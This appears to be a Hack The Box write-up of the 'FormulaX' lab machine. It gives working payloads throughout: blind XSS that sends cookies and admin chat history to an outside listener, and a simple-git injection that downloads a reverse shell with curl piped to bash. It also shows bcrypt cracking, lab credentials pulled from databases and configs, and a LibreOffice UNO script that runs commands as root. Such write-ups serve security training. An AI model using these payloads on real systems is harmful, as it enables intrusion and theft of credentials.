---
layout: post
title: "HTB: FormulaX"
box: formulax
img: /img/formulax/formulax
author: Andrew Cherney
date: 2024-08-17
tags: htb hard-box season-4 xss chatbot webapp cve john ssh-tunneling libreoffice
icon: "assets/icons/formulax.png"
post_description: "A cool combination of some popular web vulnerabilities get you both a foothold and a pivot later. Databases as usual hold reused passwords and sudo carries with itself a LibreOffice command which can be exploited to use its API. Neat and straightforward box."
---

# Summary

{{ page.post_description }}

# Enumeration

```bash
nmap 10.10.11.6

Starting Nmap 7.92 ( https://nmap.org ) at 2024-03-14 13:11 CDT
Nmap scan report for 10.10.11.6
Host is up (0.058s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

## Port 80 - formulax.htb

{% include img_link src="/img/formulax/formulax_front_page" alt="front_page" ext="png" trunc=600 %}

Simple login portal with a register page. Digging around I find a reference to an api in addition to a reference to **/admin/admin.html** when checking if user is an admin. 

```javascript
axios.post(`/user/api/login`, {
        "email": email,
        "password": password
    })
```

When looking at the register page it makes a POST to another api endpoint, **/user/api/register** I make my username `raccoon'"]})=-+:;>` to check for any errors when the application returns my name. I tried the same for email but it had properly functioning regex to force an email address. 

{% include img_link src="/img/formulax/formulax_register_page.png" alt="front_page" ext="png" trunc=600 %}

![restricted home post login]({{ page.img }}_restricted_home.png)

Standard about page, a chatbot with limited functionality, a contact us page which supposedly goes directly to the admin, and a change password page is what we have at our disposal. 

![chatbot]({{ page.img }}_chatbot.png)

![contact us]({{ page.img }}_contact_us.png)

Well time for enumeration of these new services I have access to, to start we can find the chatbot is immediately vulnerable to XSS. 

![chatbot xss]({{ page.img }}_xss.png)

That vulnerability is skin deep so to speak as after testing with some exfil payloads it didn't call back to my hosted server, which meant this was likely filtered in some way since the history function directly interfaces with the bot on the backend. 

After that let down I turned my attention to the contact us page. When sending a message it isn't reflected to the page, so to determine if this is vulnerable to XSS I use another remote call to my server and wait for a response. 

```bash
<img src=x onerror=this.src="http://10.10.14.5:8081/?"+document.cookie;>


httpserver 

Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...
10.10.11.6 - - [14/Mar/2024 13:58:05] "GET /? HTTP/1.1" 200 -
```

No admin cookie but I do have XSS capabilities.

# Foothold as www-data

## XSS

Time for a little bit of enumeration to determine exactly where my message is being sent. window.location can be used to find a slew of information related to the webpage you are on [more on that here](https://developer.mozilla.org/en-US/docs/Web/API/Location#wikiArticle). I opt to check the hostname and later some other non important things like origin and port for troubleshooting purposes.

```bash
<img src=x onerror=this.src="http://10.10.14.7:8082/?"+window.location.hostname;>


python3 -m http.server 8082

Serving HTTP on 0.0.0.0 port 8082 (http://0.0.0.0:8082/) ...
10.10.11.6 - - [15/Mar/2024 09:30:13] "GET /?chatbot.htb HTTP/1.1" 200 -
```

Okay so full disclosure I'm pretty sure this new domain is a rabbit hole but I scanned it anyway and there weren't any changes. Added it to my etc hosts file in the off chance it affected something in the future. 

So at this point the next vector takes a little problem solving with the current capabilities at hand. I have a chatbot with a history functionality and XSS to the admin portal (I checked and it was /admin/admin.html as the location). The next step here was obviously attempt to get the admin's history to see for any credentials, filenames, or other info I could use. Luckily the chatbot does a great job of shelling out the POST to the **/user/api/chat** for us. 

```javascript
const script = document.createElement('script');
script.src = '/socket.io/socket.io.js';
document.body.appendChild(script);
script.addEventListener('load', function () {
const res = axios.get(`/user/api/chat`); const socket = io('/',{withCredentials: true}); socket.on('message', (my_message) => { fetch("http://10.10.14.7:8086/?data=" + btoa(my_message)) }); socket.emit('client_message', 'history');
});
```

The above took a little testing to get working but let's break it down. I define a script element which I then make the source socket.io which is required to send the POST on the chatbot page. I add the script to the body of the admin page being loaded. The next chunk is ripped straight from the bot page code, where the only change is when the socket is on it will send the message through a fetch to my hosted server. And be sure to send the 'client_message' and 'history' through the socket to receive the proper request. 

To send and execute that code I need to base64 encode it then run it from XSS, done below:

```bash
<img src=x onerror='eval(atob("Y29uc3Qgc2NyaXB0ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7CnNjcmlwdC5zcmMgPSAnL3NvY2tldC5pby9zb2NrZXQuaW8uanMnOwpkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHNjcmlwdCk7CnNjcmlwdC5hZGRFdmVudExpc3RlbmVyKCdsb2FkJywgZnVuY3Rpb24gKCkgewpjb25zdCByZXMgPSBheGlvcy5nZXQoYC91c2VyL2FwaS9jaGF0YCk7IGNvbnN0IHNvY2tldCA9IGlvKCcvJyx7d2l0aENyZWRlbnRpYWxzOiB0cnVlfSk7IHNvY2tldC5vbignbWVzc2FnZScsIChteV9tZXNzYWdlKSA9PiB7IGZldGNoKCJodHRwOi8vMTAuMTAuMTQuNzo4MDg2Lz9kYXRhPSIgKyBidG9hKG15X21lc3NhZ2UpKSB9KTsgc29ja2V0LmVtaXQoJ2NsaWVudF9tZXNzYWdlJywgJ2hpc3RvcnknKTsKfSk7"))'>


python3 -m http.server 8086

Serving HTTP on 0.0.0.0 port 8086 (http://0.0.0.0:8086/) ...
10.10.11.6 - - [15/Mar/2024 11:15:24] code 501, message Unsupported method ('OPTIONS')
10.10.11.6 - - [15/Mar/2024 11:15:24] "OPTIONS /?data=R3JlZXRpbmdzIS4gSG93IGNhbiBpIGhlbHAgeW91IHRvZGF5ID8uIFlvdSBjYW4gdHlwZSBoZWxwIHRvIHNlZSBzb21lIGJ1aWxkaW4gY29tbWFuZHM= HTTP/1.1" 501 -
10.10.11.6 - - [15/Mar/2024 11:15:24] code 501, message Unsupported method ('OPTIONS')
10.10.11.6 - - [15/Mar/2024 11:15:24] "OPTIONS /?data=V3JpdGUgYSBzY3JpcHQgZm9yICBkZXYtZ2l0LWF1dG8tdXBkYXRlLmNoYXRib3QuaHRiIHRvIHdvcmsgcHJvcGVybHk= HTTP/1.1" 501 -
10.10.11.6 - - [15/Mar/2024 11:15:24] code 501, message Unsupported method ('OPTIONS')
10.10.11.6 - - [15/Mar/2024 11:15:24] "OPTIONS /?data=SGVsbG8sIEkgYW0gQWRtaW4uVGVzdGluZyB0aGUgQ2hhdCBBcHBsaWNhdGlvbg== HTTP/1.1" 501 -
10.10.11.6 - - [15/Mar/2024 11:15:24] code 501, message Unsupported method ('OPTIONS')
10.10.11.6 - - [15/Mar/2024 11:15:24] "OPTIONS /?data=TWVzc2FnZSBTZW50Ojxicj5oaXN0b3J5 HTTP/1.1" 501 -
10.10.11.6 - - [15/Mar/2024 11:15:24] code 501, message Unsupported method ('OPTIONS')
```

The messages read as follows:

**Greetings!. How can i help you today ?. You can type help to see some buildin commandsHello, I am Admin.Testing the Chat ApplicationWrite a script for  dev-git-auto-update.chatbot.htb to work properlyMessage Sent:<br>history**

A new subdomain that wouldn't have been scanned by the wordlists I have, guess I'll head there.

## simple-git Command Injection

![dev git subdomain]({{ page.img }}_dev_git_subdomain.png)

This webpage is using simple-git v3.14, and in a surprise to me there in a CVE affecting this version. [https://github.com/advisories/GHSA-3f95-r44v-8mrg](https://github.com/advisories/GHSA-3f95-r44v-8mrg). [https://github.com/gitpython-developers/GitPython/issues/1515](https://github.com/gitpython-developers/GitPython/issues/1515) is the specific post where it mentions the vulnerability. `ext::sh -c touch% /tmp/pwned` is an exploit within gitpython, and I tried the other variant using `--upload-pack=touch ./HELLO1` but I had no results.

```bash
ext::sh -c curl% http://10.10.14.7:8081/test


python3 -m http.server 8081

10.10.11.6 - - [15/Mar/2024 11:54:00] code 404, message File not found
10.10.11.6 - - [15/Mar/2024 11:54:00] "GET /test HTTP/1.1" 404 -
```

Perfect. Now I can download a revshell and execute it by piping to bash.

```bash
ext::sh -c curl% http://10.10.14.7:8081/revshell.sh|bash

httpserver 
Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...
10.10.11.6 - - [15/Mar/2024 11:59:43] "GET /revshell.sh HTTP/1.1" 200 -

nc -nvlp 7777
Listening on 0.0.0.0 7777
Connection received on 10.10.11.6 51364
bash: cannot set terminal process group (1165): Inappropriate ioctl for device
bash: no job control in this shell
www-data@formulax:~/git-auto-update$ whoami
whoami
www-data
```

# User as frank_dorky

I look around and decide to prod around the mongoDB databases for what is presumably powering the login portal of the chatbot site.

```sql
> show dbs
shshow dbs
admin    0.000GB
config   0.000GB
local    0.000GB
testing  0.000GB
> use testing
ususe testing
switched to db testing
> show tables
shshow tables
messages
users
> show collections
shshow collections
messages
users
> db["users"].find()
dbdb["users"].find()
{ "_id" : ObjectId("648874de313b8717284f457c"), "name" : "admin", "email" : "admin@chatbot.htb", "password" : "$2b$10$VSrvhM/5YGM0uyCeEYf/TuvJzzTz.jDLVJ2QqtumdDoKGSa.6aIC.", "terms" : true, "value" : true, "authorization_token" : "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySUQiOiI2NDg4NzRkZTMxM2I4NzE3Mjg0ZjQ1N2MiLCJpYXQiOjE3MTA1MzM5MTB9.NjR8EmgTcdp51L1N-T8qarvKwczASeqTiN5OblHhRUg", "__v" : 0 }
{ "_id" : ObjectId("648874de313b8717284f457d"), "name" : "frank_dorky", "email" : "frank_dorky@chatbot.htb", "password" : "$2b$10$hrB/by.tb/4ABJbbt1l4/ep/L4CTY6391eSETamjLp7s.elpsB4J6", "terms" : true, "value" : true, "authorization_token" : " ", "__v" : 0 }
```

```bash
john hash --wordlist=/opt/wordlists/rockyou.txt

Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
manchesterunited (?)
1g 0:00:00:14 DONE (2024-03-15 13:04) 0.07082g/s 198.8p/s 198.8c/s 198.8C/s catcat..keyboard
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

```bash
ssh frank_dorky@formulax.htb

The authenticity of host 'formulax.htb (10.10.11.6)' can't be established.
ECDSA key fingerprint is SHA256:bDFeJjvIvh87k82lrXLORKhN2SkDEeJck1/TCzrvyKI.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'formulax.htb,10.10.11.6' (ECDSA) to the list of known hosts.
frank_dorky@formulax.htb's password: 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-97-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Tue Mar  5 10:19:47 2024 from 10.10.14.23
frank_dorky@formulax:~$ ls
user.txt
frank_dorky@formulax:~$ cat user.txt
13cd581aa162--------------------
```

Well that was simple.

# User as kai_relay

```bash
netstat -tunlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:27017         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:36695         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8081          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8082          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:162             0.0.0.0:*                           -                   
udp6       0      0 :::162                  :::*                                -          
frank_dorky@formulax:~$ curl localhost:3000/login
<!DOCTYPE HTML>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>LibreNMS</title>
    ...
```

LibreNMS seems to be an open source network monitoring solutions, I'll need to ssh tunnel port 3000 so I can access the webpage for further enuemration

## LibreNMS

```bash
ssh frank_dorky@formulax.htb -L 3000:localhost:3000
```

![libre nms login]({{ page.img }}_libre_nms_login.png)

![libre nms dashboard]({{ page.img }}_librenms_dashboard.png)

In my scouring I could not find anything that popped out. I opted to check the public repo and search through some files present in the repo.

And to my surprise I found a php file which converts the config to json at [https://github.com/librenms/librenms/blob/master/config_to_json.php](https://github.com/librenms/librenms/blob/master/config_to_json.php). I don't have access to read the directory LibreNMS is in, but I did for some reason have access to run the php script.


```json
ls /opt/librenms/
ls: cannot open directory '/opt/librenms/': Permission denied
frank_dorky@formulax:~$ php
php          php-fpm8.1   php.default  php8.1       phpdismod    phpenmod     phpquery     
frank_dorky@formulax:~$ php /opt/librenms/config_to_json.php
{"install_dir":"\/opt\/librenms","active_directory":{"users_purge":0},"addhost_alwayscheckip":false,"alert":{"ack_until_clear":false,"admins":true,"default_copy":true,"default_if_none":false,"default_mail":false,"default_only":true,"disable":false,"fixed-contacts":true,"globals":true,"syscontact":true,"transports":{"mail":5},"tolerance_window":5,"users":false,"macros":{"rule":{"bill_quota_over_quota":"((%bills.total_data \/ %bills.bill_quota)*100) && %bills.bill_type = \"quota\"","bill_cdr_over_quota":"
...
...
...
{"now":1710538800,"onehour":1710535200,"fourhour":1710524400,"sixhour":1710517200,"twelvehour":1710495600,"day":1710452400,"twoday":1710366000,"week":1709934000,"twoweek":1709329200,"month":1707860400,"twomonth":1705182000,"threemonth":1702503600,"sixmonth":1694468400,"year":1679002800,"twoyear":1647466800},"db_host":"localhost","db_name":"librenms","db_user":"kai_relay","db_pass":"mychemicalformulaX","db_port":"3306","db_socket":""}
```

Luckily for me the huge json output places the credentials at the end of the file. Now we can ssh in as kai_relay and continue enumeration.

# Root

## Sudo

```bash
ssh kai_relay@formulax.htb

sudo -l
Matching Defaults entries for kai_relay on forumlax:
    env_reset, timestamp_timeout=0, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty,
    env_reset, timestamp_timeout=0

User kai_relay may run the following commands on forumlax:
    (ALL) NOPASSWD: /usr/bin/office.sh
    
cat /usr/bin/office.sh
#!/bin/bash
/usr/bin/soffice --calc --accept="socket,host=localhost,port=2002;urp;" --norestore --nologo --nodefault --headless

cat /usr/bin/soffice
#!/bin/sh
#
# This file is part of the LibreOffice project.
#
# This Source Code Form is subject to the terms of the Mozilla Public
# License, v. 2.0. If a copy of the MPL was not distributed with this
# file, You can obtain one at http://mozilla.org/MPL/2.0/.
#
# This file incorporates work covered by the following license notice:
#
#   Licensed to the Apache Software Foundation (ASF) under one or more
#   contributor license agreements. See the NOTICE file distributed
#   with this work for additional information regarding copyright
#   ownership. The ASF licenses this file to you under the Apache
#   License, Version 2.0 (the "License"); you may not use this file
#   except in compliance with the License. You may obtain a copy of
#   the License at http://www.apache.org/licenses/LICENSE-2.0 .
...
```

So here let me give a little bit of context, LibreOffice is a free alternative to Microsoft Office. Calc is Libre's Excel. soffice as a command is the way to interact with it in the cli, so the vulnerability likely isn't hidden in there. The script we can run with sudo passes a few unfamiliar arguments to LibreOffice. As per the man page:

```
[--accept](https://www.mankier.com/1/libreoffice#--accept)=_accept-string_

Specifies a UNO-URL connect-string to create a UNO acceptor through which other programs can connect to access the API. Note that API access allows execution of arbitrary commands. The syntax of a UNO-URL connect-string is: _uno:connection-type,params;protocol-name,params;ObjectName_
```

And as it says right there the API allows for execution of arbitrary commands. I found a script that isn't exactly what I need but it helps shell out the initial arguments: [https://stackoverflow.com/questions/61457120/how-to-use-libreoffice-api-uno-with-python-windows](https://stackoverflow.com/questions/61457120/how-to-use-libreoffice-api-uno-with-python-windows). And after looking deeper I found the OpenOffice api documentation which helped search and look further into specific components: [https://www.openoffice.org/api/docs/common/ref/com/sun/star/system/SystemShellExecute.html](https://www.openoffice.org/api/docs/common/ref/com/sun/star/system/SystemShellExecute.html). 

The pivotal part I needed was how to execute commands, and I found [a forum post referencing .execute and the SystemShellExecute service](https://forum.openoffice.org/en/forum/viewtopic.php?t=107395). 

After putting all the pieces together I got the following exploit script:

```python
import uno
from com.sun.star.beans import PropertyValue

localContext = uno.getComponentContext()
resolver = localContext.ServiceManager.createInstanceWithContext("com.sun.star.bridge.UnoUrlResolver", localContext)
context = resolver.resolve("uno:socket,host=localhost,port=2002;urp;StarOffice.ComponentContext")
command = context.ServiceManager.createInstanceWithContext("com.sun.star.system.SystemShellExecute", context)
command.execute("cat", "/root/root.txt", 1)
```

I define the local context, set up the protocol resolver for Uno, make a connection, set up the service to execute commands, then send the command which requires 2 arguments, no more or less. Now I run the sudo command in one window and with another session run the exploit:

```bash
Step 1:

kai_relay@formulax:~$ sudo /usr/bin/office.sh


Step 2:

kai_relay@formulax:~$ python3 exploit.py 


The result:

3c2a482d477f6--------------------
```

I didn't bother getting a root shell but the most reliable way I could think of with only 1 argument was wget a script, then run the script to pop a shell.


